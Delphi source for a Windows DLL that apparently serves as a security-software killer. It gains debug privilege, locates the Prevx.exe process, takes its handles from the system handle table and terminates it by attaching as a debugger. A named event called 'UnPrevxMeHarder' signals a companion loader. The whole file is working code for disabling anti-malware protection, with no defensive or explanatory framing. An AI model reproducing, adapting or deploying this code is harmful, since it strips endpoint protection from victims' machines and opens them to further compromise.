{$E dll}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$IFDEF minimum}
program oxuetb_lib;
{$ENDIF}
unit oxuetb_lib;
interface

uses
  Windows, WinNative, RTL;


implementation

const
  String5: PWideChar = '\BaseNamedObjects\UnPrevxMeHarder';
  ProcessesMaxID = 1;
  TargetProcesses: array[0..ProcessesMaxID] of PWideChar = ('Prevx.exe', '');

type
  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

var
  ProcessHandles: array[0..31] of THANDLE;
  ProcessesID: array[0..ProcessesMaxID] of DWORD;
  ProcessHandlesCount: integer = 0;

  SnapShotHandle: THANDLE;
  EventHandle: THANDLE;
  pBuffer: PROCESSENTRY32W;
  attr: OBJECT_ATTRIBUTES;
  str1: UNICODE_STRING;
  buf: array[0..PAGE_SIZE] of BYTE;
  buf1: LBuf;

function FillProcessesArray(): boolean;
var
  bFound: boolean;
  bytesIO: ULONG;
  buf: PSYSINFOBUF;
  last, i, c: integer;
  pbi: PROCESS_BASIC_INFORMATION;
begin
  result := false;

  ProcessHandlesCount := 0;
  memzero(@ProcessesID, sizeof(ProcessesID));
  memzero(@ProcessHandles, sizeof(ProcessHandles));

  last := 0;
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
  begin
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat

        for i := 0 to ProcessesMaxID - 1 do
        begin
          if (strcmpiW(pBuffer.szExeFile, TargetProcesses[i]) = 0) then
          begin
            ProcessesID[last] := pBuffer.th32ProcessID;
            inc(last);
          end;
        end;

      until (not Process32NextW(SnapShotHandle, @pBuffer));
    CloseHandle(SnapShotHandle);
  end else exit;

  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(DWORD(-1), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (buf <> nil) then
  begin

    ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
    for c := 0 to Integer(buf^.uHandleCount) - 1 do
      if (buf^.rHandleTable[c].ProcessId = NtGetCurrentProcessId()) and (buf^.rHandleTable[c].ObjectTypeNumber = 5) then
      begin
        ProcessHandles[ProcessHandlesCount] := buf^.rHandleTable[c].Handle;

        bFound := false;
        if (ZwQueryInformationProcess(ProcessHandles[ProcessHandlesCount], ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO) = STATUS_SUCCESS) then
        begin

          for i := 0 to ProcessesMaxID do
            if (pbi.UniqueProcessId = ProcessesID[i]) then
            begin
              bFound := true;
              inc(ProcessHandlesCount);
              break;
            end;

        end;
        if not bFound then
          ProcessHandles[ProcessHandlesCount] := 0;

      end;
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bytesIO, MEM_RELEASE);
  end;
  result := (ProcessHandlesCount > 0);
end;

procedure KillProcesses();
var
  i: integer;
  bytesIO: DWORD;
  buf: PSYSINFOBUF;
begin
  if (DbgUiConnectToDbg() <> STATUS_SUCCESS) then exit;

  for i := 0 to ProcessHandlesCount - 1 do
  begin
    if (DbgUiDebugActiveProcess(ProcessHandles[i]) = STATUS_SUCCESS) then
      ZwClose(ProcessHandles[i]);
  end;
  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(NtCurrentProcess, @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
  for i := 0 to buf^.uHandleCount - 1 do
    if (buf^.rHandleTable[i].ProcessId = NtGetCurrentProcessId()) then
    begin
      if (buf^.rHandleTable[i].ObjectTypeNumber = $8) then
      begin
        ZwClose(buf^.rHandleTable[i].Handle);
        break;
      end;
    end;
  bytesIO := 0;
  ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bytesIO, MEM_RELEASE);
end;

procedure main();
begin
  EventHandle := 0;
  Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE);
  RtlInitUnicodeString(@str1, String5);
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr) = STATUS_SUCCESS) then
  begin
    if FillProcessesArray() then
      KillProcesses();
    ZwSetEvent(EventHandle, nil);
    ZwClose(EventHandle);
  end;
end;

asm
  call main
  xor eax, eax
  inc eax
  retn $000c
end.

